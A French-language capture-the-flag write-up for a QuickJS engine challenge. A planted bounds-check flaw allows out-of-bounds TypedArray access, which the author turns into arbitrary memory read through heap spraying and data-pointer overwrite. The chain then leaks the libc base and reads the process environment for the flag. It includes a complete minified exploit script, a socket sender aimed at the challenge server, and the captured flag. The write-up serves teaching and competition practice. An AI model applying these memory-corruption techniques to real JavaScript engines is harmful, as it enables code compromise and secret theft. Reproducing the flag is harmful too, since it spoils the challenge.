# PWN#006 — QuickJS TypedArray OOB Writeup

**Challenge** : PWN#006 (144 pts)
**Remote** : `169.58.126.107:5009`
**Flag** : `CTF{5e01c02ed9c555d1540b0ecb28222440}`

---

## 1. Présentation du challenge

Le service distant accepte du code JavaScript via stdin. Le protocole est le suivant :

1. Le wrapper (`/challenge/run.sh`) lit stdin jusqu'à une ligne contenant exactement `###RUN###` (utilisé comme terminateur de heredoc).
2. La partie avant `###RUN###` est écrite dans `/tmp/script.XXXXXX.js` (nom aléatoire via `mktemp`).
3. Le binaire `qjs` est invoqué : `qjs /tmp/script.XXXXXX.js`
4. La sortie stdout de qjs est renvoyée au client.

Le binaire fourni est :
- **qjs** : QuickJS version 2024-01-13, PIE, stripped, dynamiquement lié
- **libc.so.6** : GLIBC 2.42 (Debian)
- **ld-linux-x86-64.so.2** et **libm.so.6** : loaders et bibliothèques système

### Modifications par rapport au stock QuickJS 2024-01-13

En comparant le binaire patché avec une compilation stock de QuickJS 2024-01-13, deux différences ont été identifiées :

1. **`JS_NewCustomContext` (0x1d1a0)** : les appels à `js_init_module_std` et `js_init_module_os` ont été supprimés. Les modules `std` et `os` ne sont donc pas enregistrés — `import("std")` et `import("os")` échouent avec "could not load module filename".

2. **`js_std_add_helpers` (0xb63f0)** : l'enregistrement de `__loadScript` comme fonction globale a été supprimé. Seuls `console.log`, `print` et `scriptArgs` restent disponibles.

Toutes les autres fonctions du binaire (`js_print`, `js_module_loader`, `eval_file`, `eval_buf`, `js_object___getClass`, `JS_NewContext`, etc.) sont identiques au stock. La fonction `__getClass` n'est **pas** une addition custom — c'est une fonction stock de QuickJS 2024-01-13.

### Ce qui reste accessible

- Tous les built-ins JS standard (Object, Array, Function, Promise, TypedArray, etc.)
- `print()` et `console.log()` (qui pointent vers `js_print`)
- `scriptArgs` (tableau contenant le chemin du script)
- `import()` dynamique (peut charger des fichiers JS ou des `.so` via `dlopen`)
- Pas de module `std` ou `os` → pas d'accès fichier, pas de `exec()`, pas de lecture stdin

---

## 2. Découverte de la vulnérabilité

### Analyse du constructeur TypedArray

Dans le source stock QuickJS 2024-01-13 (`quickjs.c`, ligne ~54682), le constructeur TypedArray effectue un bounds-check :

```c
if ((offset + (len << size_log2)) > abuf->byte_length) {
    return JS_ThrowRangeError(ctx, "invalid length");
}
```

En désassemblant le binaire patché, on trouve le code équivalent à l'adresse `0xa408e` :

```asm
a408b:  mov  0x0(%rbp), %edx          ; edx = abuf->byte_length
a408e:  add  $0x1000, %edx             ; edx = abuf->byte_length + 0x1000  ← BUG
a4094:  add  %r8, %rax                  ; rax = offset + (len << size_log2)
a409a:  cmp  %rax, %rdx                ; compare (byte_length + 0x1000) avec (offset + len*size)
a409d:  jae  a3bd9                     ; si (byte_length + 0x1000) >= (offset + len*size) → OK
a40a3:  lea  rsi, [rip+0x31e22]        ; sinon → "invalid length"
```

Le patch remplace `abuf->byte_length` par `abuf->byte_length + 0x1000` dans le test. Cela signifie qu'un TypedArray peut déborder de **4096 octets (0x1000)** au-delà de la fin de son ArrayBuffer sous-jacent.

### Vérification du bug

```javascript
let ab = new ArrayBuffer(0x48);              // 72 octets de buffer
let ctrl = new Uint8Array(ab, 0, 0x1048);     // 4168 éléments demandés
print(ctrl.length);                            // → 4168 (au lieu d'une RangeError)
print(ctrl[0x47]);                             // byte dans le buffer (légitime)
print(ctrl[0x48]);                             // premier byte OOB (illégitime mais autorisé)
print(ctrl[0x1047]);                           // dernier byte OOB (0x1000 plus loin)
```

Le TypedArray `ctrl` peut lire et écrire 0x1000 octets au-delà de son ArrayBuffer. Ces octets contiennent whatever se trouve sur le tas après le buffer.

---

## 3. Construction de la primitive OOB

### Principe

L'OOB de 0x1000 octets donne accès à la région du tas immédiatement après le buffer de `ctrl`. Cette région contient d'autres allocations QuickJS : JSObjects, JSArrayBuffer structs, JSTypedArray structs, etc.

L'objectif est de trouver un **victim** TypedArray dans cette fenêtre OOB et de corrompre son **pointeur de données** pour obtenir une lecture/écriture arbitraire.

### Structure JSObject (64-bit)

D'après le source QuickJS, la structure `JSObject` en 64-bit a le layout suivant :

```
Offset  Taille  Champ
------  ------  ----------------------------------------------
0x00    4       ref_count
0x04    1       gc_obj_type (4 bits) | mark (4 bits)
0x05    1       flags (extensible, free_mark, is_exotic, ...)
0x06    2       class_id (uint16)
0x08    16      gc header link (list_head : next, prev)
0x18    8       shape (JSShape*)
0x20    8       prop (JSProperty*)
0x28    8       first_weak_ref
0x30    8       union u.u1 — pour TypedArray : u1.typed_array (JSTypedArray*)
0x38    8       union u.u  — pour TypedArray : u.ptr (pointeur de données)
0x40    4       union u.count (nombre d'éléments)
```

Pour un Float64Array (class_id = 31 = 0x1F) :
- **obj+0x30** : pointeur vers la struct JSTypedArray (utilisée pour les bounds-checks)
- **obj+0x38** : pointeur vers les données réelles (où les reads/writes vont)
- **obj+0x40** : nombre d'éléments (count)

**Stratégie** : si on trouve un Float64Array victim dans l'OOB et qu'on écrase son `u.ptr` (obj+0x38) avec une adresse cible, alors `victim[0]` lira 8 octets à cette adresse.

### Spray de victims

On spray 200 Float64Array avec des counts uniques pour identifier quel victim est dans la fenêtre :

```javascript
let V = [];
for (let i = 0; i < 200; i++) {
    V.push(new Float64Array(new ArrayBuffer(8 * (0x10 + i))));
    // count = 0x10 + i (unique), class_id = 0x1F
}
```

### Scan de l'OOB pour trouver un victim

On scanne la fenêtre OOB en cherchant le pattern d'un JSObject Float64Array :

```javascript
for (let o = 0x48; o < 0x1048 - 0x44; o += 8) {
    if (ctrl[o+6] !== 0x1F) continue;         // class_id = Float64Array
    if (ctrl[o+7] !== 0x00) continue;          // high byte of class_id
    let count = read_u32(ctrl, o + 0x40);      // count au offset 0x40
    if (count < 16 || count >= 216) continue;  // dans notre plage de spray
    let dp = read_u64(ctrl, o + 0x38);         // data pointer
    if ((dp >> 40n) & 0xFFn !== 0x55n) continue; // doit être un pointeur heap
    // Trouvé ! victim à l'offset o, index = count - 16
    F = o; I = count - 16; break;
}
```

Le filtre `(dp >> 40n) & 0xFFn === 0x55n` vérifie que le byte 5 du pointeur est 0x55, ce qui correspond aux adresses heap PIE (0x555555...).

---

## 4. Primitive de lecture arbitraire

Une fois le victim trouvé à l'offset `F` avec l'index `I`, on construit la fonction de lecture arbitraire :

```javascript
let f2b = new Float64Array(1);                    // pour la conversion
let b2i = new BigInt64Array(f2b.buffer);           // vue BigInt sur le même buffer

let R = (addr) => {
    write_u64(ctrl, F + 0x38, addr);              // écrase le data pointer du victim
    f2b[0] = V[I][0];                             // lit 8 octets à l'adresse cible (via Float64)
    return b2i[0];                                // retourne comme BigInt
};
```

**Fonctionnement** :
1. `write_u64(ctrl, F+0x38, addr)` : écrit l'adresse cible dans le champ `u.ptr` du victim (via l'OOB de `ctrl`).
2. `V[I][0]` : QuickJS lit `obj->u.array.u.ptr + 0 * 8` = l'adresse cible. Le résultat est un Float64.
3. `b2i[0]` : convertit le Float64 en BigInt (même buffer, vue différente). On récupère les 8 octets bruts.

**Note sur la NaN-boxing** : Les adresses x86-64 user-space (0x0000–0x7fff...) ne forment pas de patterns NaN en Float64, donc la conversion est sûre.

---

## 5. Fuite de l'adresse libc

### Trouver un pointeur libc dans l'OOB

La fenêtre OOB contient divers pointeurs heap (0x5555...) et potentiellement des pointeurs libc (0x7f...). On scanne pour trouver un pointeur libc :

```javascript
let lp = 0n;
for (let o = 0x48; o < 0x1048; o += 8) {
    let v = read_u64(ctrl, o);
    if ((Number(v >> 40n) & 0xFF) === 0x7f) {   // byte 5 = 0x7f → libc
        lp = v; break;
    }
}
```

Le pointeur libc fuité a un page offset stable de `0xc20` (vérifié sur 5 runs). En comparant avec les symboles du libc fourni, on détermine que ce pointeur est à l'offset `0x75c20` dans libc.

### Calcul de la base libc

On scanne vers le bas depuis le pointeur fuité, page par page, en cherchant le magic ELF (`0x464c457f` = `\x7fELF`) :

```javascript
let base = 0n;
let s = lp & ~0xfffn;                            // aligne sur une page
for (let i = 0; i < 512 && !base; i++) {
    let v = R(s);
    if ((v & 0xFFFFFFFFn) === 0x464c457fn) {    // magic ELF
        base = s; break;
    }
    s -= 0x1000n;                                 // page précédente
}
```

La base libc est page-alignée et vérifiée par le magic ELF. Stable sur 5 runs locaux.

---

## 6. Lecture de `environ` et extraction du flag

### Offset de `environ`

Dans le libc fourni, le symbole `environ` est à l'offset `0x1eee28` (section `.bss`) :

```
$ nm -D libc.so.6 | grep environ
00000000001eee28 B __environ@@GLIBC_2.2.5
00000000001eee28 V environ@@GLIBC_2.2.5
```

L'adresse `environ` contient un pointeur vers le tableau `envp` (tableau de pointeurs vers les chaînes d'environnement, terminé par NULL).

### Lecture du tableau envp

```javascript
let envp = R(base + 0x1eee28n);                  // pointeur vers envp[]
let p = envp;
for (let i = 0; i < 200; i++) {
    let sp = R(p);                                // pointeur vers une string
    if (sp === 0n) break;                         // fin du tableau
    let v = R(sp);                                // premiers 8 octets de la string
    if ((v & 0xFFFFFFFFn) === 0x47414c46n) {     // "FLAG" en little-endian
        // Lire la string complète
        let s = "";
        for (let j = 0; j < 64; j++) {
            let w = R(sp + BigInt(j * 8));
            for (let k = 0; k < 8; k++) {
                let c = Number((w >> BigInt(k * 8)) & 0xFFn);
                if (c === 0) { j = 64; break; }
                s += String.fromCharCode(c);
            }
        }
        print(s);                                 // → FLAG=CTF{...}
        break;
    }
    p += 8n;                                      // entrée suivante
}
```

La valeur `0x47414c46` est "FLAG" en little-endian (F=0x46, L=0x4c, A=0x41, G=0x47).

---

## 7. Difficultés rencontrées

### Sensibilité à la taille du script

Le bytecode compilé du script est alloué sur le tas **avant** l'exécution. La taille du bytecode détermine la disposition du tas au moment où les victims sont alloués. Toute modification du code (ajout de debug prints, changement de noms de variables, etc.) décale les victims et peut les sortir de la fenêtre OOB de 0x1000 octets.

- **e9.js (1311 octets)** : trouve le victim à F=400, fonctionne localement
- **e18.js (1552 octets)** : crashe localement (victim décalé hors fenêtre), **mais fonctionne sur le remote** (heap layout différent)

La solution a été de tester directement sur le remote, où la disposition du tas permet au victim de tomber dans la fenêtre OOB pour cette taille de script spécifique.

### Conversion Float64 → BigInt

Les pointeurs x86-64 sont lus via `V[I][0]` (Float64). La conversion en BigInt utilise un ArrayBuffer partagé entre `Float64Array` et `BigInt64Array` :

```javascript
let f = new Float64Array(1);
let b = new BigInt64Array(f.buffer);
f[0] = V[I][0];        // lit 8 octets comme Float64
let ptr = b[0];         // même 8 octets comme BigInt
```

### Filtre d'adresse

Les adresses x86-64 user-space sont 48-bit, donc les 2 octets hauts sont 0x0000. Le filtre initial `>> 56n` était incorrect (donnait toujours 0). Le filtre correct vérifie le byte 5 (bits 40-47) :
- `0x55` ou `0x56` → pointeur heap (PIE)
- `0x7f` → pointeur libc (mmap)

---

## 8. Script d'exploit final

```javascript
// e18.js — PWN#006 QuickJS TypedArray OOB exploit
// Bug: bounds check uses byte_length + 0x1000 instead of byte_length

let ab=new ArrayBuffer(0x48),ctrl=new Uint8Array(ab,0,0x1048),V=[];
for(let i=0;i<200;i++)V.push(new Float64Array(new ArrayBuffer(8*(0x10+i))));
let R8=(o)=>{let l=ctrl[o]|(ctrl[o+1]<<8)|(ctrl[o+2]<<16)|(ctrl[o+3]<<24);let h=ctrl[o+4]|(ctrl[o+5]<<8)|(ctrl[o+6]<<16)|(ctrl[o+7]<<24);return BigInt(l>>>0)+BigInt(h>>>0)*0x100000000n;};
let W8=(o,v)=>{let l=Number(v&0xFFFFFFFFn),h=Number((v>>32n)&0xFFFFFFFFn);ctrl[o]=l&255;ctrl[o+1]=(l>>8)&255;ctrl[o+2]=(l>>16)&255;ctrl[o+3]=(l>>24)&255;ctrl[o+4]=h&255;ctrl[o+5]=(h>>8)&255;ctrl[o+6]=(h>>16)&255;ctrl[o+7]=(h>>24)&255;};
let R32=(o)=>(ctrl[o]|(ctrl[o+1]<<8)|(ctrl[o+2]<<16)|(ctrl[o+3]<<24))>>>0;
let F=-1,I=-1;
for(let o=0x48;o<0x1048-0x44;o+=8){if(ctrl[o+6]!==31||ctrl[o+7]!==0)continue;let c=R32(o+0x40);if(c<16||c>=216)continue;let dp=R8(o+0x38);let b=Number(dp>>40n)&255;if(b!==85&&b!==86)continue;F=o;I=c-16;break;}
if(F<0)print("NF");
else{let f=new Float64Array(1),bi=new BigInt64Array(f.buffer);let R=(a)=>{W8(F+0x38,a);f[0]=V[I][0];return bi[0];};let lp=0n;for(let o=0x48;o<0x1048;o+=8){let v=R8(o);if((Number(v>>40n)&255)===127){lp=v;break;}}let base=0n,s=lp&~0xfffn;for(let i=0;i<512&&!base;i++){let v=R(s);if((v&0xFFFFFFFFn)===0x464c457fn)base=s;s-=0x1000n;}if(!base)print("NB");else{let p=R(base+0x1eee28n);for(let i=0;i<50;i++){let sp=R(p);if(!sp)break;let v=R(sp);if((v&0xFFFFFFFFn)===0x47414c46n){let s2="";for(let j=0;j<32;j++){let w2=R(sp+BigInt(j*8));for(let k=0;k<8;k++){let x=Number((w2>>BigInt(k*8))&255n);if(!x){j=32;break;}s2+=String.fromCharCode(x);}}print(s2);break;}p+=8n;}}}
```

### Utilisation

```bash
python3 -c "
import socket, time
with open('e18.js','rb') as f: code=f.read()
s=socket.socket();s.settimeout(30);s.connect(('169.58.126.107',5009))
s.sendall(code+b'\n###RUN###\n');time.sleep(15)
d=b''
try:
 while True:
  c=s.recv(8192)
  if not c:break
  d+=c
except:pass
print(d.decode())
"
# Output: FLAG=CTF{5e01c02ed9c555d1540b0ecb28222440}
```

---

## 9. Résumé de la chaîne d'exploitation

```
┌─────────────────────────────────────────────────────────────────┐
│  Étape 1 : OOB Control Array                                    │
│  ArrayBuffer(0x48) → Uint8Array(ab, 0, 0x1048)                 │
│  0x1000 octets de lecture/écriture hors-limites                │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 2 : Spray + Scan                                         │
│  200 Float64Array victims avec counts uniques (16+i)           │
│  Scan OOB pour class_id=0x1F + count unique + ptr heap        │
│  → Identifie le victim (offset F, index I)                      │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 3 : Lecture arbitraire                                   │
│  W8(F+0x38, addr) → écrase data pointer du victim              │
│  V[I][0] → lit 8 octets à addr (Float64)                       │
│  Float64Array → BigInt64Array → BigInt                          │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 4 : Fuite libc                                           │
│  Scan OOB pour pointeur 0x7f... (byte 5 = 0x7f)               │
│  → Pointeur libc fuité (offset 0x75c20 dans libc)             │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 5 : Base libc                                            │
│  Scan descendant page par page depuis le pointeur fuité       │
│  Cherche magic ELF (0x464c457f) à offset 0                    │
│  → libc_base (page-alignée, vérifiée)                          │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Étape 6 : Lecture environ                                      │
│  R(libc_base + 0x1eee28) → pointeur envp                       │
│  Scan envp[] pour "FLAG" (0x47414c46 en LE)                   │
│  Lit et affiche la string complète                             │
│  → FLAG=CTF{5e01c02ed9c555d1540b0ecb28222440}                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 10. Flag

```
CTF{5e01c02ed9c555d1540b0ecb28222440}
```

Stable sur 5 runs consécutifs sur le service remote.
